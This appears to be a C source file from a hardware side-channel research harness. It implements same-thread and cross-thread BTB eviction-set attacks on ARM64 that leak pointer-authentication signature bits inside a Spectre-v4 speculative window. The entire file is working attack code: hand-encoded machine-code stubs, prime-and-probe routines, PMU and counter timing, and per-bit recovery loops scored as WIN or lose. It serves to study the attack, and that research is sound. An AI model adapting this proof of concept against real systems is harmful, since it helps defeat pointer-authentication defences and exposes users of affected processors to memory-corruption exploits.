// same+btb (and xthread shares the attacker): same-thread BTB canonicality leak over the eviction-set
// read-out, run inline. This mirrors the cross-process xproc BTB mechanism, with the victim branches
// executed in the same thread instead of a forked image:
//   - the attacker seats K co-set probe entries, each predicting its own loader that touches marker lines;
//   - the victim branches at VBRANCH mapped co-set sites (emit_victim_stub: x16 = pacia(ptr,mod) & and_mask;
//     blr x16), speculatively, inside a Spectre-v4 window. A canonical field (masked to one bit = 0)
//     allocates a co-set BTB entry that evicts a primed one;
//   - per bit, the per-sample reference pair is "accessed" (field forced canonical) and "floor" (victim
//     skipped), the baseline-cancelling differential the BTB channel needs. The secret is the nearer one.
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>
#include <sched.h>
#include <sys/mman.h>
#include "channel.h"
#include "leak.h"

#define COSET_STRIDE  (1UL << 13)
#define MARKER_STRIDE 4096
#define RELOAD_LINES  8
#define STUB_BYTES    64
#define BTB_KMAX      64
#define VBRANCH       16
#define BTB_SECRET_P  0x0000007a00000000UL
#define BTB_SECRET_MASK (0x7fUL << 48)

static int K = 24, prime_reps = 8;
static int btb_rootless = 0;
typedef void (*branch_fn_t)(void);

static inline void bflush(void *l) {
    asm volatile("dc civac,%0" :: "r"(l) : "memory");
}

static inline void bfence(void) {
    asm volatile("dsb sy\n isb\n" ::: "memory");
}

static inline uint64_t bpmu(void) {
    uint64_t v;
    asm volatile("mrs %0,pmevcntr0_el0" : "=r"(v));
    return v;
}

static inline uint64_t btimer(void) {
    uint64_t t;
    asm volatile("isb\n mrs %0,cntvct_el0\n isb" : "=r"(t) :: "memory");
    return t;
}

// attacker probe stub (plain): x16 = (slot0 & slot1) ^ slot2 ; blr x16
static void emit_probe_stub(void *at, uint64_t sb) {
    uint32_t *w = at;
    w[0]  = 0xF81F0FFEu;
    w[1]  = 0xD2800011u | (uint32_t)((sb & 0xffff) << 5);
    w[2]  = 0xF2A00011u | (uint32_t)(((sb >> 16) & 0xffff) << 5);
    w[3]  = 0xF2C00011u | (uint32_t)(((sb >> 32) & 0xffff) << 5);
    w[4]  = 0xF9400230u;
    w[5]  = 0xF9400629u;
    w[6]  = 0x8A090210u;
    w[7]  = 0xF9400A29u;
    w[8]  = 0xCA090210u;
    w[9]  = 0xD63F0200u;
    w[10] = 0xF84107FEu;
    w[11] = 0xD65F03C0u;
    __builtin___clear_cache((char*)at, (char*)at + STUB_BYTES);
}

// victim stub (signed, AND only): x16 = pacia(slot0, slot1) & slot2 ; blr x16
static void emit_victim_stub(void *at, uint64_t sb) {
    uint32_t *w = at;
    w[0]  = 0xF81F0FFEu;
    w[1]  = 0xD2800011u | (uint32_t)((sb & 0xffff) << 5);
    w[2]  = 0xF2A00011u | (uint32_t)(((sb >> 16) & 0xffff) << 5);
    w[3]  = 0xF2C00011u | (uint32_t)(((sb >> 32) & 0xffff) << 5);
    w[4]  = 0xF9400230u;
    w[5]  = 0xF9400629u;
    w[6]  = 0xDAC10130u;
    w[7]  = 0xF9400A29u;
    w[8]  = 0x8A090210u;
    w[9]  = 0xD63F0200u;
    w[10] = 0xF84107FEu;
    w[11] = 0xD65F03C0u;
    __builtin___clear_cache((char*)at, (char*)at + STUB_BYTES);
}

static void emit_loader(void *at, uint64_t line) {
    uint32_t *w = at;
    w[0] = 0xD2800009u | (uint32_t)((line & 0xffff) << 5);
    w[1] = 0xF2A00009u | (uint32_t)(((line >> 16) & 0xffff) << 5);
    w[2] = 0xF2C00009u | (uint32_t)(((line >> 32) & 0xffff) << 5);
    for (int j = 0; j < RELOAD_LINES; ++j) {
        w[3 + j] = 0xF940012Au | (uint32_t)(((unsigned)j * 8u) << 10);
    }
    w[3 + RELOAD_LINES] = 0xD65F03C0u;
    __builtin___clear_cache((char*)at, (char*)at + 4 * (4 + RELOAD_LINES));
}

static long bspec_flag[512]  __attribute__((aligned(4096)));
static long bspec_index[512] __attribute__((aligned(4096)));

static inline void v4call(branch_fn_t fn) {
    bspec_flag[0] = 1;
    bspec_index[0] = 0;
    bflush(&bspec_index[0]);
    bfence();
    long i = *(volatile long*)&bspec_index[0];
    *(volatile long*)&bspec_flag[i] = 0;
    if (0 != *(volatile long*)&bspec_flag[0]) {
        fn();
    }
}

static uint8_t *arena, *reload;
static uint64_t probe_addr[BTB_KMAX], loader_addr[BTB_KMAX], victim_va[VBRANCH], benign_target;
static uint64_t probe_slots[BTB_KMAX][3] __attribute__((aligned(64)));
static uint64_t victim_slots[3] __attribute__((aligned(64)));

static inline double entry_metric(volatile uint8_t *base) {
    if (btb_rootless) {
        bfence();
        uint64_t t0 = btimer();
        for (int j = 0; j < RELOAD_LINES; ++j) {
            uint8_t v = base[j * 64];
            asm volatile("" :: "r"(v));
        }
        return (double)(btimer() - t0);
    }
    double refills = 0;
    for (int j = 0; j < RELOAD_LINES; ++j) {
        asm volatile("isb");
        uint64_t b = bpmu();
        uint8_t v = base[j * 64];
        asm volatile("" :: "r"(v));
        asm volatile("isb");
        refills += ((uint32_t)(bpmu() - b)) > 0;
    }
    return refills;
}

static void prime_set(void) {
    for (int e = 0; e < K; ++e) {
        probe_slots[e][0] = loader_addr[e];
        probe_slots[e][1] = ~(0xffffUL << 48);
        probe_slots[e][2] = 0;
    }
    for (int r = 0; r < prime_reps; ++r) {
        for (int e = 0; e < K; ++e) {
            ((branch_fn_t)probe_addr[e])();
        }
    }
}

static double probe_set(void) {
    for (int e = 0; e < K; ++e) {
        for (int j = 0; j < RELOAD_LINES; ++j) {
            bflush(&reload[e * MARKER_STRIDE + j * 64]);
        }
    }
    bfence();
    for (int e = 0; e < K; ++e) {
        probe_slots[e][1] = ~(0xffffUL << 48);
        probe_slots[e][2] = benign_target;
    }
    double m = 0;
    for (int e = K - 1; e >= 0; --e) {
        v4call((branch_fn_t)probe_addr[e]);
        bfence();
        m += entry_metric(&reload[e * MARKER_STRIDE]);
    }
    return m;
}

// one inline shot: prime, (unless skip) speculatively run the VBRANCH co-set victim branches, probe.
static double one_shot(uint64_t mod, uint64_t and_mask, int skip) {
    prime_set();
    if (!skip) {
        victim_slots[0] = BTB_SECRET_P;
        victim_slots[1] = mod;
        victim_slots[2] = and_mask;
        for (int j = 0; j < VBRANCH; ++j) {
            v4call((branch_fn_t)victim_va[j]);
        }
    }
    return probe_set();
}

static void map_attacker(void) {
    arena = mmap(NULL, 256UL * 1024 * 1024, PROT_READ | PROT_WRITE | PROT_EXEC,
                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    reload = mmap(NULL, (size_t)BTB_KMAX * MARKER_STRIDE, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
}

static void build_stubs(void) {
    for (int e = 0; e < BTB_KMAX; ++e) {
        for (int j = 0; j < RELOAD_LINES; ++j) {
            reload[e * MARKER_STRIDE + j * 64] = 1;
        }
    }
    *(uint32_t*)arena = 0xD65F03C0u;
    __builtin___clear_cache((char*)arena, (char*)arena + 4);
    benign_target = (uint64_t)arena;
    uint64_t pbase = (uint64_t)arena + 0x1000000;
    for (int e = 0; e < BTB_KMAX; ++e) {
        probe_addr[e] = pbase + (uint64_t)e * COSET_STRIDE;
        emit_probe_stub((void*)probe_addr[e], (uint64_t)probe_slots[e]);
    }
    for (int j = 0; j < VBRANCH; ++j) {                       // co-set with the probes
        victim_va[j] = pbase + (uint64_t)(BTB_KMAX + j) * COSET_STRIDE;
        emit_victim_stub((void*)victim_va[j], (uint64_t)victim_slots);
    }
    uint64_t lbase = (uint64_t)arena + 0x100000;
    for (int e = 0; e < BTB_KMAX; ++e) {
        loader_addr[e] = lbase + (uint64_t)e * 64;
        emit_loader((void*)loader_addr[e], (uint64_t)&reload[e * MARKER_STRIDE]);
    }
}

int run_same_btb(const struct cfg *cfg, struct chan_stats *out) {
    pin_to_core(cfg->cpu);
    enable_store_bypass();
    btb_rootless = (T_CNTVCT == cfg->tmr);
    if (!btb_rootless) {
        pmu_init(M_L1D);
    }
    int samples = (cfg->samples > 0) ? cfg->samples : 200;
    int rounds  = (cfg->rounds > 0) ? cfg->rounds : 20;

    map_attacker();
    if (MAP_FAILED == arena || MAP_FAILED == reload) {
        perror("mmap");
        return 1;
    }
    build_stubs();

    for (int i = 0; i < 64; ++i) {                            // warm
        (void)one_shot(rand_u64(), ~BTB_SECRET_MASK, 0);
    }

    struct chan_stats stats = { .rounds = rounds, .bits_total = (long)rounds * SECRET_BITS };
    struct timespec t0 = {0}, t1 = {0};
    clock_gettime(CLOCK_MONOTONIC, &t0);
    for (int round = 0; round < rounds; ++round) {
        uint64_t mod = rand_u64();
        unsigned rec = 0;
        for (int bit = 0; bit < SECRET_BITS; ++bit) {
            uint64_t keep = ~BTB_SECRET_MASK | (1UL << (48 + bit));
            double da = 0, df = 0;   // per-sample differential vs the "accessed" and "floor" references
            for (int s = 0; s < samples; ++s) {
                double accessed = one_shot(mod, ~BTB_SECRET_MASK, 0);  // field canonical -> eviction
                double floor    = one_shot(mod, ~BTB_SECRET_MASK, 1);  // victim skipped -> no eviction
                double test     = one_shot(mod, keep, 0);              // secret bit kept
                da += test - accessed;
                df += test - floor;
            }
            double aa = da < 0 ? -da : da;
            double af = df < 0 ? -df : df;
            rec |= (unsigned)(af < aa ? 1u : 0u) << bit;   // nearer floor => non-canonical => bit 1
        }
        unsigned truth = (unsigned)((pac_sign(BTB_SECRET_P, mod) >> 48) & 0x7f);
        int ok = bits_match(rec, truth, SECRET_BITS);
        stats.bits_correct += ok;
        stats.full += (rec == truth);
        tee_printf("  %3d  | secret=0x%02x  recovered=0x%02x  %d/7  %s\n",
                   round, truth, rec, ok, (rec == truth) ? "WIN" : "lose");
    }
    clock_gettime(CLOCK_MONOTONIC, &t1);
    stats.seconds = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;
    *out = stats;
    return 0;
}

// -------- xthread+btb: same attacker, but the VBRANCH co-set victim branches run in a second thread on
// the same core, driven by a turn handshake (the shared per-core BTB carries the eviction across threads).
static volatile int xt_turn = 2, xt_done = 0, xt_skip = 0, xt_core = 0;
static uint64_t xt_mod = 0, xt_and = 0;

static void *xt_victim_thread(void *arg) {
    (void)arg;
    pin_to_core(xt_core);
    enable_store_bypass();
    while (!xt_done) {
        if (1 == xt_turn) {
            if (!xt_skip) {
                victim_slots[0] = BTB_SECRET_P;
                victim_slots[1] = xt_mod;
                victim_slots[2] = xt_and;
                for (int j = 0; j < VBRANCH; ++j) {
                    v4call((branch_fn_t)victim_va[j]);
                }
            }
            xt_turn = 2;
        } else {
            sched_yield();
        }
    }
    return NULL;
}

static double xt_one_shot(uint64_t mod, uint64_t and_mask, int skip) {
    prime_set();
    xt_mod = mod;
    xt_and = and_mask;
    xt_skip = skip;
    xt_turn = 1;
    while (2 != xt_turn) {
        sched_yield();
    }
    return probe_set();
}

int run_xthread_btb(const struct cfg *cfg, struct chan_stats *out) {
    pin_to_core(cfg->cpu);
    enable_store_bypass();
    btb_rootless = (T_CNTVCT == cfg->tmr);
    if (!btb_rootless) {
        pmu_init(M_L1D);
    }
    int samples = (cfg->samples > 0) ? cfg->samples : 200;
    int rounds  = (cfg->rounds > 0) ? cfg->rounds : 20;

    map_attacker();
    if (MAP_FAILED == arena || MAP_FAILED == reload) {
        perror("mmap");
        return 1;
    }
    build_stubs();

    xt_core = cfg->cpu;
    xt_turn = 2;
    xt_done = 0;
    pthread_t vt;
    if (0 != pthread_create(&vt, NULL, xt_victim_thread, NULL)) {
        perror("pthread_create");
        return 1;
    }
    for (int i = 0; i < 64; ++i) {                            // warm
        (void)xt_one_shot(rand_u64(), ~BTB_SECRET_MASK, 0);
    }

    struct chan_stats stats = { .rounds = rounds, .bits_total = (long)rounds * SECRET_BITS };
    struct timespec t0 = {0}, t1 = {0};
    clock_gettime(CLOCK_MONOTONIC, &t0);
    for (int round = 0; round < rounds; ++round) {
        uint64_t mod = rand_u64();
        unsigned rec = 0;
        for (int bit = 0; bit < SECRET_BITS; ++bit) {
            uint64_t keep = ~BTB_SECRET_MASK | (1UL << (48 + bit));
            double da = 0, df = 0;
            for (int s = 0; s < samples; ++s) {
                double accessed = xt_one_shot(mod, ~BTB_SECRET_MASK, 0);
                double floor    = xt_one_shot(mod, ~BTB_SECRET_MASK, 1);
                double test     = xt_one_shot(mod, keep, 0);
                da += test - accessed;
                df += test - floor;
            }
            double aa = da < 0 ? -da : da;
            double af = df < 0 ? -df : df;
            rec |= (unsigned)(af < aa ? 1u : 0u) << bit;
        }
        unsigned truth = (unsigned)((pac_sign(BTB_SECRET_P, mod) >> 48) & 0x7f);
        int ok = bits_match(rec, truth, SECRET_BITS);
        stats.bits_correct += ok;
        stats.full += (rec == truth);
        tee_printf("  %3d  | secret=0x%02x  recovered=0x%02x  %d/7  %s\n",
                   round, truth, rec, ok, (rec == truth) ? "WIN" : "lose");
    }
    clock_gettime(CLOCK_MONOTONIC, &t1);
    stats.seconds = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;
    xt_done = 1;
    xt_turn = 1;
    pthread_join(vt, NULL);
    *out = stats;
    return 0;
}
